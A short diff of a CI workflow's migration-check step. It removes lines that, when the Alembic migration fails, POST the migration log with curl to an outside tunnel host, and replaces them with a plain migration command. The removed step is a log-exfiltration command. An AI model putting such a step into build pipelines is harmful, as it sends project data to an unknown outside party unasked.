@@ -82,11 +82,7 @@ jobs:
       - name: Verify Alembic Migrations
         env:
           DATABASE_URL: postgresql+asyncpg://aura:aura@localhost:5432/aura
-        run: |
-          if ! uv run alembic upgrade head > alembic.log 2>&1; then
-            curl -X POST -d @alembic.log https://9219e99a6b733357-43-230-199-86.serveousercontent.com || true
-            exit 1
-          fi
+        run: uv run alembic upgrade head
         
       - name: Run Architecture Tests
         env:
